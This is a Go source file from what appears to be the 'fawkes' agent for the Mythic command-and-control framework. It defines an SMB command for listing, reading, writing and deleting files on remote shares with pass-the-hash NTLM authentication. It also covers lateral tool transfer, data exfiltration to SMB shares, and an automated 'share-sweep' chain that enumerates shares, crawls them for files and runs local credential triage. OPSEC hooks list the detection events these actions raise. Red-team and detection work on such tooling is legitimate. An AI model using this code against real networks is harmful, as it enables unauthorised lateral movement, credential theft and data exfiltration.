package agentfunctions

import (
	"encoding/json"
	"fmt"
	"path/filepath"
	"strings"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
	"github.com/MythicMeta/MythicContainer/mythicrpc"
)

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name: "smb",
		AssociatedBrowserScript: &agentstructs.BrowserScript{
			ScriptPath: filepath.Join(".", "fawkes", "browserscripts", "smb_new.js"),
			Author:     "@galoryber",
		},
		Description:         "SMB file operations on remote shares. List shares, browse, read/write/delete files, create directories, rename/move via SMB2 with NTLM auth. Pass-the-hash support.",
		HelpString:          "smb -action shares -host 192.168.1.1 -username user -password pass -domain DOMAIN\nsmb -action ls -host 192.168.1.1 -share C$ -username admin -hash aad3b435b51404ee:8846f7eaee8fb117 -domain DOMAIN\nsmb -action mkdir -host 192.168.1.1 -share C$ -path Users/Public/staging -username admin -password pass\nsmb -action mv -host 192.168.1.1 -share C$ -path old.txt -destination new.txt -username admin -password pass",
		Version:             2,
		Author:              "@galoryber",
		MitreAttackMappings: []string{"T1021.002", "T1550.002", "T1570"},
		TaskCompletionFunctions: map[string]agentstructs.PTTaskCompletionFunction{
			"shareSweepSharesDone":    shareSweepSharesDone,
			"shareSweepShareHuntDone": shareSweepShareHuntDone,
			"shareSweepTriageDone":    shareSweepTriageDone,
		},
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{
				agentstructs.SUPPORTED_OS_WINDOWS,
				agentstructs.SUPPORTED_OS_LINUX,
				agentstructs.SUPPORTED_OS_MACOS,
			},
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:             "action",
				CLIName:          "action",
				ModalDisplayName: "Action",
				Description:      "Operation: shares, ls, cat, upload, rm, mkdir, mv, push (lateral tool transfer), exfil (data exfiltration to SMB share), share-sweep (automated chain)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Choices:          []string{"shares", "ls", "cat", "upload", "rm", "mkdir", "mv", "push", "exfil", "share-sweep"},
				DefaultValue:     "shares",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: true, GroupName: "Default"},
				},
			},
			{
				Name:                 "host",
				CLIName:              "host",
				ModalDisplayName:     "Target Host",
				Description:          "Remote host IP or hostname",
				ParameterType:        agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:         "",
				DynamicQueryFunction: getActiveHostList,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: true, GroupName: "Default"},
				},
			},
			{
				Name:             "username",
				CLIName:          "username",
				ModalDisplayName: "Username",
				Description:      "Username for NTLM auth (can include DOMAIN\\user or user@domain)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				DynamicQueryFunction: getCallbackUserList,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: true, GroupName: "Default"},
				},
			},
			{
				Name:             "password",
				CLIName:          "password",
				ModalDisplayName: "Password",
				Description:      "Password for NTLM auth (or use -hash for pass-the-hash)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "hash",
				CLIName:          "hash",
				ModalDisplayName: "NTLM Hash",
				Description:      "NT hash for pass-the-hash (hex, e.g., aad3b435b51404ee:8846f7eaee8fb117 or just the NT hash)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "domain",
				CLIName:          "domain",
				ModalDisplayName: "Domain",
				Description:      "NTLM domain (auto-detected from username if DOMAIN\\user or user@domain format)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				DynamicQueryFunction: getCallbackDomainList,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "share",
				CLIName:          "share",
				ModalDisplayName: "Share Name",
				Description:      "SMB share name (e.g., C$, ADMIN$, ShareName). Required for ls, cat, upload, rm, mkdir, mv.",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "path",
				CLIName:          "path",
				ModalDisplayName: "File/Directory Path",
				Description:      "Path within the share. Required for cat, upload, rm, mkdir, mv. Optional for ls. For mv, this is the source path.",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "content",
				CLIName:          "content",
				ModalDisplayName: "File Content",
				Description:      "Content to write (for upload action only)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "destination",
				CLIName:          "destination",
				ModalDisplayName: "Destination Path",
				Description:      "Destination path within the share (for mv action — rename/move target)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "source",
				CLIName:          "source",
				ModalDisplayName: "Source File (Local)",
				Description:      "Local file path on the agent to push to the remote share (for push action — lateral tool transfer T1570)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "port",
				CLIName:          "port",
				ModalDisplayName: "SMB Port",
				Description:      "SMB port (default: 445)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				DefaultValue:     445,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input == "" {
				return nil
			}
			return args.LoadArgsFromJSONString(input)
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
			host, _ := taskData.Args.GetStringArg("host")
			action, _ := taskData.Args.GetStringArg("action")
			share, _ := taskData.Args.GetStringArg("share")
			msg := fmt.Sprintf("OPSEC WARNING: SMB %s operation on %s.", action, host)
			if action == "share-sweep" {
				msg = fmt.Sprintf("OPSEC WARNING: Share Sweep Chain against %s. This executes 3 automated steps: (1) SMB share enumeration, (2) share-hunt file crawl across all readable shares, (3) local credential triage. Combined footprint generates multiple SMB sessions, share access events (5140/5145), and file access logs. Behavioral analytics may flag the automated access pattern.", host)
			} else {
				if share == "ADMIN$" || share == "C$" || share == "IPC$" {
					msg += fmt.Sprintf(" Accessing %s share — administrative share access is a high-fidelity lateral movement indicator.", share)
				}
				if action == "push" {
					source, _ := taskData.Args.GetStringArg("source")
					msg += fmt.Sprintf(" Pushing local file '%s' to remote share — file write to remote system is a lateral tool transfer indicator (T1570).", source)
				}
				if action == "exfil" {
					source, _ := taskData.Args.GetStringArg("source")
					msg += fmt.Sprintf(" CRITICAL: Data exfiltration of '%s' to remote SMB share (T1048.003). "+
						"File write to remote share generates SMB traffic and file creation events. "+
						"DLP solutions may inspect SMB file transfers for sensitive content.", source)
				}
				msg += " SMB connections generate Event ID 5140/5145 (share access) and 4624 (network logon)."
			}
			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
				TaskID:             taskData.Task.ID,
				Success:            true,
				OpsecPreBlocked:    false,
				OpsecPreMessage:    msg,
				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
			response := agentstructs.PTTaskProcessResponseMessageResponse{
				TaskID:  processResponse.TaskData.Task.ID,
				Success: true,
			}
			responseText, ok := processResponse.Response.(string)
			if !ok || responseText == "" {
				return response
			}
			// Track SMB exfil operations
			var exfilResult struct {
				Host       string `json:"host"`
				Share      string `json:"share"`
				RemotePath string `json:"remote_path"`
				FileName   string `json:"filename"`
				TotalSize  int    `json:"total_size"`
				Success    bool   `json:"success"`
			}
			if err := json.Unmarshal([]byte(responseText), &exfilResult); err == nil && exfilResult.Host != "" && exfilResult.Success {
				createArtifact(processResponse.TaskData.Task.ID, "Exfiltration",
					fmt.Sprintf("SMB exfil: %s (%d bytes) → \\\\%s\\%s\\%s",
						exfilResult.FileName, exfilResult.TotalSize,
						exfilResult.Host, exfilResult.Share, exfilResult.RemotePath))
			}
			// Track SMB operations: look for host reference in output
			if strings.Contains(responseText, "Shares on") || strings.Contains(responseText, "SMB") {
				for _, line := range strings.Split(responseText, "\n") {
					if strings.Contains(line, "Shares on") {
						createArtifact(processResponse.TaskData.Task.ID, "Network Connection",
							strings.TrimSpace(line))
						break
					}
				}
			}
			return response
		},
		TaskFunctionOPSECPost: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskOPSECPostTaskMessageResponse {
			return agentstructs.PTTaskOPSECPostTaskMessageResponse{
				TaskID:              taskData.Task.ID,
				Success:             true,
				OpsecPostBlocked:    false,
				OpsecPostMessage:    "OPSEC AUDIT: SMB operation completed. SMB connections generate Event ID 5140/5145 (share access) and 4624 (logon). Failed auth generates Event ID 4625.",
				OpsecPostBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}

			host, _ := taskData.Args.GetStringArg("host")
			action, _ := taskData.Args.GetStringArg("action")
			share, _ := taskData.Args.GetStringArg("share")
			path, _ := taskData.Args.GetStringArg("path")

			// share-sweep: automated chain — smb shares → share-hunt → triage
			if action == "share-sweep" {
				if host == "" {
					response.Success = false
					response.Error = "share-sweep requires -host parameter"
					return response
				}

				username, _ := taskData.Args.GetStringArg("username")
				if username == "" {
					response.Success = false
					response.Error = "share-sweep requires -username parameter for SMB authentication"
					return response
				}

				password, _ := taskData.Args.GetStringArg("password")
				hash, _ := taskData.Args.GetStringArg("hash")
				domain, _ := taskData.Args.GetStringArg("domain")

				display := fmt.Sprintf("Share Sweep: \\\\%s (shares → share-hunt → triage)", host)
				response.DisplayParams = &display

				// Store chain context for completion functions
				chainCtx, _ := json.Marshal(map[string]string{
					"host":     host,
					"username": username,
					"password": password,
					"hash":     hash,
					"domain":   domain,
				})
				chainCtxStr := string(chainCtx)
				response.Stdout = &chainCtxStr

				// Step 1: Enumerate shares
				params := map[string]interface{}{
					"action":   "shares",
					"host":     host,
					"username": username,
				}
				if password != "" {
					params["password"] = password
				}
				if hash != "" {
					params["hash"] = hash
				}
				if domain != "" {
					params["domain"] = domain
				}
				paramsJSON, _ := json.Marshal(params)

				callbackFunc := "shareSweepSharesDone"
				_, err := mythicrpc.SendMythicRPCTaskCreateSubtask(
					mythicrpc.MythicRPCTaskCreateSubtaskMessage{
						TaskID:                  taskData.Task.ID,
						SubtaskCallbackFunction: &callbackFunc,
						CommandName:             "smb",
						Params:                  string(paramsJSON),
					},
				)
				if err != nil {
					response.Success = false
					response.Error = fmt.Sprintf("Failed to create share enumeration subtask: %s", err.Error())
					return response
				}

				createArtifact(taskData.Task.ID, "Subtask Chain",
					fmt.Sprintf("Share Sweep: smb shares \\\\%s → share-hunt → triage", host))
				logOperationEvent(taskData.Task.ID,
					fmt.Sprintf("[CHAIN] Share sweep started against %s", host), false)
				return response
			}

			displayMsg := fmt.Sprintf("SMB %s \\\\%s", action, host)
			if share != "" {
				displayMsg += fmt.Sprintf("\\%s", share)
			}
			if path != "" {
				displayMsg += fmt.Sprintf("\\%s", path)
			}
			if action == "push" {
				source, _ := taskData.Args.GetStringArg("source")
				displayMsg = fmt.Sprintf("SMB push %s → \\\\%s\\%s\\%s", source, host, share, path)
			}
			response.DisplayParams = &displayMsg

			artifactMsg := fmt.Sprintf("SMB2 %s to %s", action, host)
			if share != "" {
				artifactMsg += fmt.Sprintf("\\%s", share)
			}
			mythicrpc.SendMythicRPCArtifactCreate(mythicrpc.MythicRPCArtifactCreateMessage{
				TaskID:           taskData.Task.ID,
				BaseArtifactType: "API Call",
				ArtifactMessage:  artifactMsg,
			})

			if action == "push" {
				logOperationEvent(taskData.Task.ID,
					fmt.Sprintf("[LATERAL TOOL TRANSFER] SMB push to \\\\%s\\%s\\%s", host, share, path), false)
				tagTask(taskData.Task.ID, "LATERAL",
					fmt.Sprintf("SMB file push to %s", host))
			}

			return response
		},
	})
}

// shareSweepSharesDone handles share enumeration completion, creates share-hunt subtask.
func shareSweepSharesDone(taskData *agentstructs.PTTaskMessageAllData, subtaskData *agentstructs.PTTaskMessageAllData, groupName *agentstructs.SubtaskGroupName) agentstructs.PTTaskCompletionFunctionMessageResponse {
	response := agentstructs.PTTaskCompletionFunctionMessageResponse{
		TaskID:  taskData.Task.ID,
		Success: true,
	}

	responseText := getSubtaskResponses(subtaskData.Task.ID)
	shareCount := 0
	if responseText != "" {
		for _, line := range strings.Split(responseText, "\n") {
			line = strings.TrimSpace(line)
			if line != "" && !strings.HasPrefix(line, "Shares on") && !strings.HasPrefix(line, "-") &&
				!strings.HasPrefix(line, "Name") && !strings.HasPrefix(line, "Found") {
				shareCount++
			}
		}
	}

	mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
		TaskID:   taskData.Task.ID,
		Response: []byte(fmt.Sprintf("[Step 1/3] Share enumeration complete. %d shares found.", shareCount)),
	})

	if shareCount == 0 {
		completed := true
		response.Completed = &completed
		msg := "Share Sweep: no shares found — chain complete"
		response.Stdout = &msg
		mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
			TaskID: taskData.Task.ID, Response: []byte(msg),
		})
		return response
	}

	// Get chain context for credentials
	chainCtx := extractChainContext(taskData.Task.Stdout)
	host := chainCtx["host"]
	username := chainCtx["username"]
	password := chainCtx["password"]
	hash := chainCtx["hash"]

	// Step 2: Run share-hunt to crawl shares for interesting files
	params := map[string]interface{}{
		"hosts":    host,
		"username": username,
		"filter":   "all",
	}
	if password != "" {
		params["password"] = password
	}
	if hash != "" {
		params["hash"] = hash
	}
	domain := chainCtx["domain"]
	if domain != "" {
		params["domain"] = domain
	}
	paramsJSON, _ := json.Marshal(params)

	callbackFunc := "shareSweepShareHuntDone"
	_, err := mythicrpc.SendMythicRPCTaskCreateSubtask(
		mythicrpc.MythicRPCTaskCreateSubtaskMessage{
			TaskID:                  taskData.Task.ID,
			SubtaskCallbackFunction: &callbackFunc,
			CommandName:             "share-hunt",
			Params:                  string(paramsJSON),
		},
	)
	if err != nil {
		completed := true
		response.Completed = &completed
		msg := fmt.Sprintf("Share Sweep: shares found but failed to start share-hunt: %s", err.Error())
		response.Stderr = &msg
		return response
	}

	return response
}

// shareSweepShareHuntDone handles share-hunt completion, creates local triage subtask.
func shareSweepShareHuntDone(taskData *agentstructs.PTTaskMessageAllData, subtaskData *agentstructs.PTTaskMessageAllData, groupName *agentstructs.SubtaskGroupName) agentstructs.PTTaskCompletionFunctionMessageResponse {
	response := agentstructs.PTTaskCompletionFunctionMessageResponse{
		TaskID:  taskData.Task.ID,
		Success: true,
	}

	responseText := getSubtaskResponses(subtaskData.Task.ID)
	fileCount := 0
	if responseText != "" {
		fileCount = strings.Count(responseText, "\n")
	}

	mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
		TaskID:   taskData.Task.ID,
		Response: []byte(fmt.Sprintf("[Step 2/3] Share hunt complete. ~%d interesting files found on remote shares.", fileCount)),
	})

	// Step 3: Run local triage for credential/config files
	callbackFunc := "shareSweepTriageDone"
	_, err := mythicrpc.SendMythicRPCTaskCreateSubtask(
		mythicrpc.MythicRPCTaskCreateSubtaskMessage{
			TaskID:                  taskData.Task.ID,
			SubtaskCallbackFunction: &callbackFunc,
			CommandName:             "triage",
			Params:                  `{"action":"credentials"}`,
		},
	)
	if err != nil {
		completed := true
		response.Completed = &completed
		msg := fmt.Sprintf("Share Sweep: share hunt done but failed to start triage: %s", err.Error())
		response.Stderr = &msg
		return response
	}

	return response
}

// shareSweepTriageDone handles triage completion, aggregates all chain results.
func shareSweepTriageDone(taskData *agentstructs.PTTaskMessageAllData, subtaskData *agentstructs.PTTaskMessageAllData, groupName *agentstructs.SubtaskGroupName) agentstructs.PTTaskCompletionFunctionMessageResponse {
	response := agentstructs.PTTaskCompletionFunctionMessageResponse{
		TaskID:  taskData.Task.ID,
		Success: true,
	}

	mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
		TaskID:   taskData.Task.ID,
		Response: []byte("[Step 3/3] Local triage complete."),
	})

	// Aggregate all subtask results
	parentID := taskData.Task.ID
	searchResult, err := mythicrpc.SendMythicRPCTaskSearch(mythicrpc.MythicRPCTaskSearchMessage{
		TaskID:             parentID,
		SearchParentTaskID: &parentID,
	})

	summary := "=== Share Sweep Chain Complete ===\n"
	if err == nil && searchResult.Success {
		successCount := 0
		errorCount := 0
		for _, task := range searchResult.Tasks {
			if task.Status == "error" {
				errorCount++
			} else if task.Completed {
				successCount++
			}
			summary += fmt.Sprintf("[%s] %s %s\n", task.Status, task.CommandName, task.DisplayParams)
		}
		summary += fmt.Sprintf("\nTotal: %d subtasks (%d success, %d errors)\n", len(searchResult.Tasks), successCount, errorCount)
	} else {
		summary += "Could not retrieve subtask details.\n"
	}

	completed := true
	response.Completed = &completed
	response.Stdout = &summary

	mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
		TaskID: taskData.Task.ID, Response: []byte(summary),
	})

	return response
}
